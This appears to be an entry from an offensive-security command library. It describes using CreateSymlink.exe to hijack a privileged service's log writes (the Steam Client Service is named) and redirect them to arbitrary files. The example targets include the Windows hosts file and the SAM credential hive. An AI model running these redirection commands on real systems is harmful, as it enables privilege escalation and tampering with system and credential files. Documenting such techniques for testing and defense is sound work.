---
data: 'CreateSymlink.exe C:\test\logs\service_log.txt <target>'
tags:
  - symlink
  - redirection
  - ntfs
type: command
executor: cmd
platforms:
  - Windows
id: a65edd90-a6e4-42b7-ab7b-4a049d037e6d
created_at: '2025-12-14T17:26:48.991Z'
updated_at: '2025-12-14T17:26:48.991Z'
verified: false
validated: true
submitted: true
---
# Create Symlink Redirection

## Command

```cmd
CreateSymlink.exe C:\test\logs\service_log.txt <target>
```

## Description

This command uses the CreateSymlink.exe utility to create an NTFS reparse point and object-directory symlink, redirecting file operations on the source path (e.g., log creation) to an arbitrary target path without requiring administrator privileges. It is used in symlink attacks to hijack writes from privileged processes like the Steam Client Service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `C:\test\logs\service_log.txt` | Source path for the symlink (must be in a writable directory) | Yes |
| `<target>` | Arbitrary target path for redirection (e.g., `C:\Windows\System32\drivers\etc\hosts`) | Yes |

## Examples

### Basic Usage

```cmd
CreateSymlink.exe C:\test\logs\service_log.txt C:\target\file.txt
```

### Advanced Usage

```cmd
CreateSymlink.exe C:\controlled\logs\output.log C:\Windows\System32\config\SAM
```

## Expected Output

'Symlink created successfully'; upon file write to source, the target is created or appended without errors. Verify with `dir <target>` showing modifications.

## Related

- [[procedures/create-symlinks-to-redirect-steam-log-writes-to-arbitrary-files]]
